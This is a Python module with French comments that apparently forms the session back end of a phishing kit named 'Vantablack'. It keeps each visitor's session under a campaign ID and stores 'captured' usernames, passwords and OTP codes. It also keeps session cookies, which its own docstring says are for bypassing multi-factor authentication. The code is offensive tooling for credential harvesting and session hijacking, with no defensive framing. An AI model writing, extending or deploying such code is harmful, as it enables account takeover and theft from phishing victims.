import uuid
import json
import time
from typing import Dict, Any, Optional
from core.cache.redis_manager import redis_cache

class SessionManager:
    """
    Gestionnaire de Session Vantablack (Redis-backed)
    Stocke l'état des sessions utilisateurs, les identifiants capturés, et les cookies.
    """
    
    SESSION_TTL = 3600  # 1 heure
    
    def create_session(self, campaign_id: str, client_ip: str, user_agent: str) -> str:
        """
        Crée une nouvelle session pour un visiteur.
        """
        session_id = str(uuid.uuid4())
        session_data = {
            "session_id": session_id,
            "campaign_id": campaign_id,
            "client_ip": client_ip,
            "user_agent": user_agent,
            "created_at": time.time(),
            "status": "active",
            "captured_data": {},
            "cookies": {}
        }
        
        self._save_session(session_id, session_data)
        return session_id

    def get_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """
        Récupère les données d'une session.
        """
        data = redis_cache.get(f"session:{session_id}")
        if data:
            return data # redis_manager gère déjà le JSON parsing si implémenté, sinon check
        return None

    def update_session(self, session_id: str, updates: Dict[str, Any]):
        """
        Met à jour les données d'une session (merge).
        """
        current_data = self.get_session(session_id)
        if current_data:
            current_data.update(updates)
            self._save_session(session_id, current_data)

    def capture_credential(self, session_id: str, key: str, value: str):
        """
        Enregistre un identifiant capturé (username, password, OTP).
        """
        session = self.get_session(session_id)
        if session:
            session["captured_data"][key] = value
            self._save_session(session_id, session)

    def capture_cookies(self, session_id: str, cookies: Dict[str, str]):
        """
        Enregistre les cookies de session (pour bypass MFA).
        """
        session = self.get_session(session_id)
        if session:
            session["cookies"].update(cookies)
            self._save_session(session_id, session)

    def _save_session(self, session_id: str, data: Dict[str, Any]):
        """
        Sauvegarde interne dans Redis.
        """
        redis_cache.set(f"session:{session_id}", data, expire=self.SESSION_TTL)

# Instance globale
session_manager = SessionManager()
